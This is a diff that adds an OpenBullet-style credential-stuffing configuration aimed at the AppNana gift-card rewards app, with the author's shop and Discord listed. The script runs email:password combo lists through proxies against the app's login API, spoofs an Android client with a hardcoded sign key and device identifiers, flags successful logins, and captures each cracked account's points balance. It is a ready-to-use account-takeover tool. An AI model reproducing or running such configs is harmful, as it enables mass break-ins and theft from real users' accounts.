@@ -1,0 +1,57 @@
+[SETTINGS]
+{
+  "Name": "APPNANA",
+  "SuggestedBots": 80,
+  "LastModified": "2019-08-19T02:49:51.9794838+05:30",
+  "AdditionalInfo": "SHOP : https://shoppy.gg/@FanTaZyX | DISCORD : FanTaZyX#2670",
+  "KeysDB": "",
+  "LocalKeysDB": "",
+  "isWtoEdit": false,
+  "Author": "FanTaZyX | XENORIS (loliX Encrypted)",
+  "Version": "1.2.1.3",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#XENORIS REQUEST POST "https://appnana2.mapiz.com/api/nanaer_login/" 
+  CONTENT "email=<USER>&password=<PASS>&source=Android.google-play&signkey=f97a355f915f8afa09f079770cfbaa43e5db6d17&android_id=fb3846cc4c44f94b&version=3.5.12&gaid=4dc126b6-441b-4774-a86b-d89ad1d432ae&gaid_enabled=true" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: com.appnana.android.giftcardrewards/3.5.12 (Linux; U; Android 5.1.1; fr-FR; A5010 Build/LMY48Z; OnePlus) 720X1280 OnePlus A5010" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json; version=1.2" 
+  HEADER "Accept-Language: fr-FR" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Host: appnana2.mapiz.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Cookie2: $Version=1" 
+
+#XENORIS KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "invalid login" 
+  KEYCHAIN Success OR 
+    KEY "SUCCESS" 
+
+#XENORIS REQUEST GET "https://appnana2.mapiz.com/api/get_nanaer_info/?email=<USER>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#XENORIS PARSE "<SOURCE>" JSON "nanas" -> CAP "POINTS" "" " POINTS" 
+
+
